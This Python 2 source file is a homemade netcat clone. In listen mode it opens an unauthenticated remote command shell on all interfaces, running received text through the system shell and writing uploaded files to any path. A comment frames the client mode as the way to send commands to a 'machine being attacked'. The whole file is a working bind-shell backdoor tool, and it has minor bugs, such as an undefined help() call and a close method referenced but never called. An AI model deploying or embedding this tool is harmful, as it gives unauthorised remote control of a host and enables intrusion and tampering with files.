import sys
import socket
import getopt
import threading
import subprocess

listen = False
upload = False
command= True
execute = ""
target = ""
port = 0
upload_destination = ""


'''
Like a TCP client we first connect ourselves to the server
in this case we wait for a reply in a loop
We also listen infinitely until the user kills the script
Note that this is the case when user has specified the 
-t flag
'''    
def client_send(mybuffer):
    
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print "Connection initiated to server with target ", target , " and port ",port
    try:
        client.connect((target,port))
        print "Connection Successful"
        if len(mybuffer):
            client.send(mybuffer)
            print "Buffer sent"
        '''
            Loop to receive back the data.
            Loop until whole response is received
        '''
        while True:
            #Initial condition
            recv_len = 1
            response = ""
            
            
            while recv_len:
                #print "Inside recv len loop"
                data =  client.recv(4096)
                
                recv_len = len(data)
                #print "Received data is as ",data
                response+=data
                
                if recv_len < 4096 :
                    break
                
            print response,
                
            mybuffer = input("")
            mybuffer +="\n"
            client.send(mybuffer)
        
    except Exception as inst:
        print "Exception (*) Exiting with exception ", inst
        client.close()
    


def run_command(command):
    '''
    This is done to strip the command of new line characters
    '''
    command = command.rstrip()
    
    try:
        output = subprocess.check_output(command, stderr = subprocess.STDOUT,
                                         shell = True)
    
    except:
        output = "Failed to execute command"
    return output


'''
Argument passed to this function is of type client
This is the function which handles most of the listen mode functionality
and required by server_loop
'''
def handle_client(clientObject):
    global execute
    global command
    global upload
    
    print command
    print "handle_client called!"
    if len(upload_destination):
        file_buffer=""
        while True:
            data = clientObject.recv(1024)
            if not data:
                break
            else:
                file_buffer+=data
        try:
            file_descript = open(upload_destination,"wb")
            file_descript.write(file_buffer)
            file_descript.close
            clientObject.send("Successfully wrote file to, %s\r\n" %upload_destination)
    
        except:
            clientObject.send("Could not save file to destination")
            clientObject.close()

    print "command as ", command
    if len(execute):
        #print "Command execution will be initiated!"
        output = run_command(execute)
        clientObject.send(output)    
    
    if command:
        #print "Inside command"
        while True:
            clientObject.send("<Netcat: >")
            cmd_buffer=""
            while "\n" not in cmd_buffer:
                cmd_buffer+=clientObject.recv(1024)
            
            print "Received buffer as ", cmd_buffer
            response =  run_command(cmd_buffer)
            clientObject.send(response)
        
def server_loop():
    global target
    #os.chdir("C:")
    if not len(target):
        target="0.0.0.0" #Specifying this IP address means listen on all interfaces, i.e ::1 and 
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((target,port))
    server.listen(5)
    
    while True:
        client_sock,addr = server.accept()
        print "Client connection initiated with client at",addr[0]," at port ",addr[1]
        client_handler= threading.Thread(target=handle_client,args=(client_sock,))
        client_handler.start()

def usage():
    print "ysUtility v1.0"
    print "Usage :-> netcat.py -t target_host -p port"
    print "-l listen on [host:port] for incoming connections"
    print "-e --execute=file_to run on listening for connection"
    print "-c --command initialize a command shell"
    print "-u --upload=destination upon receiving a connection write a file and upload to destination"
    sys.exit(0)

def main():
    global listen
    global execute
    global upload
    global target
    global command
    global port
    global upload_destination
    
    if (len(sys.argv[1:])==0):
        print "Invalid Argument length, exiting....."
        usage()
    
    try:
        opts, args = getopt.getopt(sys.argv[1:],"hle:t:p:cu:",["help","listen","execute","target","port","command","upload"])
    except getopt.GetoptError as err:
        print str(err)
        usage()
    
    for o,a in opts:
        if o in ("-h","--help"):
            help()
        elif o in ("-l","--listen"):
            listen = True
        elif o in ("-e", "--execute"):
            execute = a
        elif o in ("-c", "--commandshell"):
            command = True
        elif o in ("-u", "--upload"):
            upload_destination = a
        elif o in ("-t", "--target"):
            target = a
        elif o in ("-p", "--port"):
            port = int(a)
        else:
            assert False,"Unhandled Argument passed"
    '''
    When listening mode is not active,
    that is when we are using it to send commands to machine being attacked
    '''        
    if not listen and (port > 0):
        print "Preparing to read value"
        print "Connection initiated to server with target ", target , " and port ",port
        buffer = raw_input()
        print "Input taken as buffer ", buffer
        client_send(buffer)
    if listen:
        server_loop()
    
main()

